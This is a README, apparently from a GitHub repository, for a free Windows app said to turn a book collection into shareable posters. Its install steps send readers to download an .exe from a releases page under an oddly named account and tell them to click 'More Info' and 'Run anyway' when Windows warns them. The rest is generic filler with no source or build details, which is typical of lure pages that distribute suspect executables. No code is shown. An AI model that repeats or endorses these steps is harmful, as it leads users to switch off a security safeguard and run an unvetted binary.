# 📚 bookshelf - Create beautiful visual posters of books

[Explore Releases](https://github.com/torrealdehydic125/bookshelf/releases)

Bookshelf helps you track your reading habits. It turns your book collection into clean visual posters. You can share these images with friends or save them to keep track of your progress. This tool is free and open source. It works on your Windows computer without the need for complex setup or coding knowledge.

## 🚀 Getting Started

Follow these steps to set up the software on your Windows computer. This guide assumes you use a standard version of Windows 10 or Windows 11.

1. Go to the [official download page](https://github.com/torrealdehydic125/bookshelf/releases).
2. Look for the latest version at the top of the page.
3. Choose the file that ends in .exe for Windows.
4. Save the file to your computer.
5. Double-click the file to start the installation.

If Windows shows a security message, click More Info and select Run anyway. This happens because the app is a new release.

## 🛠 Features

The bookshelf app offers features to manage your reading library:

* **Visual Posters:** Generate high-quality images of your book shelves to share online.
* **Reading Tracker:** Log the books you read throughout the year.
* **Easy Import:** Import your book list from other services.
* **Private Storage:** Keep your library data on your own computer.
* **Custom Styles:** Adjust the layout and colors of your posters to match your taste.

## 💻 System Requirements

Your computer must meet these basic needs to run the app:

* Operating System: Windows 10 or 11.
* Memory: At least 4GB of RAM.
* Storage: 200MB of free disk space.
* Internet Connection: Needed for the first setup and to sync book covers.

## 📖 How to Use the App

Once you open the software, you see a clear interface. 

**Adding Books**
Click the Add Book button. Type the title or scan the ISBN code. The app finds the book details for you.

**Building a Shelf**
Drag and drop your books into the order you prefer. You can group them by genre, color, or reading date.

**Generating Posters**
Click the Export button. Choose the image size. Tap Save to create your poster files. You can now post these images to social media or keep them as a digital archive.

## ❓ Common Questions

**Is the software free?**
Yes. You can use all features without cost.

**Does my data stay private?**
Your library information remains on your machine. You control who sees your posters.

**Can I run this on a Mac?**
This version works on Windows. Keep an eye on the release page for updates regarding other operating systems.

**Does the app need constant internet access?**
You only need the internet to fetch book covers. You can arrange your shelves without a connection once the data downloads.

**How do I update the app?**
When a new version comes out, download the new installer from the link above. It will replace the old version while keeping your library data safe.

## ⚙️ Troubleshooting

If you encounter issues, try these steps:

* **App fails to open:** Restart your computer and try again.
* **Missing images:** Ensure your internet connection functions properly.
* **Installation error:** Check that you have enough disk space on your C: drive.
* **Slow performance:** Close unused programs while you export large posters.
